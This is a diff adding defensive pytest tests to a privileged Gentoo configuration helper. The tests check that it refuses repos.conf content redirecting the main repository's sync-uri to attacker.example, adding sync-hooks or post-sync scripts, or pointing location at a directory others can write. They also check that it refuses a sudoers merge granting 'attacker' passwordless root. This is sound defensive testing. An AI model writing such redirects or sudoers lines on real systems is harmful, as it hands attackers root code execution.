@@ -1166,3 +1166,197 @@ def test_config_protect_cannot_be_pointed_at_a_directory_others_can_write(
     # and the faked euid says root is asking. That is exactly the shape of the
     # thing being refused.
     assert theirs.resolve() not in helper.protected_roots()
+
+
+# -- what a whole-file write may contain ------------------------------------
+
+
+def test_write_file_refuses_a_file_that_redefines_another_repository(portage: Path) -> None:
+    """Portage reads every file in repos.conf and merges them, so a section
+    repeated in a file read later replaces the earlier definition.
+
+    The path check says "repos.conf, so yes"; it has nothing to say about a file
+    called guru.conf that defines gentoo. That is not adding a repository, it is
+    pointing every package on the system somewhere else, and it arrived on stdin.
+    """
+    target = portage / "repos.conf" / "zzz-guru.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content="[gentoo]\nsync-uri = https://attacker.example/tree.git\n",
+        expect=None,
+    )
+
+    assert answer["ok"] is False
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_refuses_a_default_section(portage: Path) -> None:
+    """[DEFAULT] applies to every other section, including ones in files this
+    program never wrote."""
+    target = portage / "repos.conf" / "guru.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content=(
+            "[DEFAULT]\nsync-uri = https://attacker.example/\n"
+            "\n[guru]\nlocation = /var/db/repos/guru\n"
+        ),
+        expect=None,
+    )
+
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_refuses_a_file_naming_the_main_repository(portage: Path) -> None:
+    target = portage / "repos.conf" / "gentoo.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content="[gentoo]\nsync-uri = https://attacker.example/tree.git\n",
+        expect=None,
+    )
+
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "[guru]\nsync-hooks = /tmp/mine.sh\n",
+        "[guru]\nsync-openpgp-key-path = /tmp/mine.gpg\n",
+        "[guru]\npost-sync = /tmp/mine.sh\n",
+    ],
+)
+def test_write_file_refuses_keys_gentstore_does_not_write(portage: Path, content: str) -> None:
+    """A list of what this application writes, not a list of what looks
+    dangerous — the same rule as LINE_EDITABLE, one level down."""
+    target = portage / "repos.conf" / "guru.conf"
+    answer = call("write_file", path=str(target), content=content, expect=None)
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_refuses_a_location_others_can_write(
+    portage: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """`location` names the directory Portage reads ebuilds from, and an ebuild
+    is a shell script this machine runs as root while merging."""
+    theirs = tmp_path / "theirs"
+    theirs.mkdir()
+    monkeypatch.setattr(helper.os, "geteuid", lambda: 0)
+
+    target = portage / "repos.conf" / "guru.conf"
+    answer = call(
+        "write_file",
+        path=str(target),
+        content=f"[guru]\nlocation = {theirs}\nsync-type = git\n",
+        expect=None,
+    )
+
+    assert answer["code"] == "bad_content"
+    assert not target.exists()
+
+
+def test_write_file_still_writes_the_definitions_gentstore_makes(portage: Path) -> None:
+    """The refusals above must not have cost the operation its reason to exist."""
+    binrepos = portage / "binrepos.conf"
+    binrepos.mkdir()
+    target = binrepos / "gentoo-binhost.conf"
+    content = binrepos_section_text()
+
+    answer = call("write_file", path=str(target), content=content, expect=None)
+
+    assert answer["ok"] and answer["changed"], answer
+    assert target.read_text(encoding="utf-8") == content
+
+
+def binrepos_section_text() -> str:
+    """What core/binrepos.py actually produces, so the two cannot drift apart."""
+    from gentstore.core import binrepos
+
+    return binrepos.section_text("gentoo-binhost", "https://distfiles.gentoo.org/releases", 1)
+
+
+def test_a_whole_file_write_goes_no_deeper_than_gentstore_does(portage: Path) -> None:
+    nested = portage / "repos.conf" / "nested"
+    nested.mkdir()
+    answer = call(
+        "write_file", path=str(nested / "guru.conf"), content="[guru]\n", expect=None
+    )
+    assert answer["code"] == "not_owned"
+
+
+# -- what a merge has to say about the file it is merging into --------------
+
+
+def test_cfg_apply_merge_requires_an_expectation(portage: Path, tmp_path) -> None:
+    """A merge writes text that arrived in the request. Nothing else in the
+    operation ties that text to anything the user saw — so it has to say what it
+    expects to find, and an accept, whose content is on disk, does not."""
+    target = tmp_path / "etc" / "sudoers"
+    target.write_text("root ALL=(ALL) ALL\n", encoding="utf-8")
+    candidate = tmp_path / "etc" / "._cfg0000_sudoers"
+    candidate.write_text("root ALL=(ALL) ALL\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply",
+        path=str(candidate),
+        decision="merge",
+        content="attacker ALL=(ALL) NOPASSWD: ALL\n",
+    )
+
+    assert answer["ok"] is False
+    assert answer["code"] == "bad_request"
+    assert target.read_text(encoding="utf-8") == "root ALL=(ALL) ALL\n"
+    assert candidate.exists()
+
+
+def test_cfg_apply_merge_refuses_when_the_target_moved_on(portage: Path, tmp_path) -> None:
+    target = tmp_path / "etc" / "conf.d"
+    target.write_text("edited by hand\n", encoding="utf-8")
+    candidate = tmp_path / "etc" / "._cfg0000_conf.d"
+    candidate.write_text("new\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply",
+        path=str(candidate),
+        decision="merge",
+        content="merged\n",
+        expect="what the diff showed\n",
+    )
+
+    assert answer["code"] == "changed_underfoot"
+    assert target.read_text(encoding="utf-8") == "edited by hand\n"
+
+
+def test_cfg_apply_merge_goes_through_when_it_says_what_it_saw(portage: Path, tmp_path) -> None:
+    target = tmp_path / "etc" / "conf.d"
+    target.write_text("old\n", encoding="utf-8")
+    candidate = tmp_path / "etc" / "._cfg0000_conf.d"
+    candidate.write_text("new\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply", path=str(candidate), decision="merge", content="merged\n", expect="old\n"
+    )
+
+    assert answer["ok"], answer
+    assert target.read_text(encoding="utf-8") == "merged\n"
+    assert not candidate.exists()
+
+
+def test_cfg_apply_merge_into_a_file_that_is_not_there_yet(portage: Path, tmp_path) -> None:
+    """`expect: null` means "this file should not exist yet" — the shape a new
+    configuration file arrives in."""
+    candidate = tmp_path / "etc" / "._cfg0000_brand-new"
+    candidate.write_text("new\n", encoding="utf-8")
+
+    answer = call(
+        "cfg_apply", path=str(candidate), decision="merge", content="merged\n", expect=None
+    )
+
+    assert answer["ok"], answer
+    assert (tmp_path / "etc" / "brand-new").read_text(encoding="utf-8") == "merged\n"
